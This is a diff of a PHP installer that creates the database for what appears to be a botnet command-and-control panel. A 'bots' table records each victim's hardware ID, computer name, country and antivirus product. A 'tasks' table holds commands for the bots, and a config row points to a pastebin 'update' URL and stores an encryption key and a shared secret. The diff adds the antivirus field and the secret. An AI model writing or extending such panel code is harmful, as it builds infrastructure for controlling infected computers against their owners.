@@ -41,15 +41,15 @@ class Install{
                     CREATE DATABASE IF NOT EXISTS `".$mysqldatabaseRand."`;GRANT ALL PRIVILEGES ON `".$mysqldatabaseRand."`.* TO '".$mysqldatabaseRand."'@'localhost';
                     USE ".$mysqldatabaseRand.";
                     
-                    CREATE TABLE `config` (
+                     CREATE TABLE `config` (
                       `id` int(11) NOT NULL,
                       `enryptionkey` varchar(255) DEFAULT NULL,
                       `check_update_url` varchar(255) DEFAULT NULL,
-                      `todo2` varchar(255) DEFAULT NULL
+                      `useragent` varchar(255) DEFAULT NULL
                     ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
-                    
-                    INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `todo2`) VALUES
-                    (1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', NULL);
+                            
+        INSERT INTO `config` (`id`, `enryptionkey`, `check_update_url`, `useragent`) VALUES
+        (1, 'KCQ', 'https://pastebin.com/raw/YBGEBviB', 'somesecret');
 
                    ALTER TABLE `config`
                    ADD PRIMARY KEY (`id`);
@@ -65,8 +65,9 @@ class Install{
                       `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
                     ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
                     
-                   CREATE TABLE `bots` (
+                    CREATE TABLE `bots` (
                   `id` int(11) NOT NULL,
+                  `antivirus` varchar(255) DEFAULT NULL,
                   `hwid` varchar(255) DEFAULT NULL,
                   `computrername` varchar(100) DEFAULT NULL,
                   `country` varchar(25) DEFAULT NULL,
@@ -83,6 +84,7 @@ class Install{
                   `install_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
                   `version` varchar(10) NOT NULL DEFAULT '0.0'
                 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;
+
    
    
                    CREATE TABLE `tasks` (
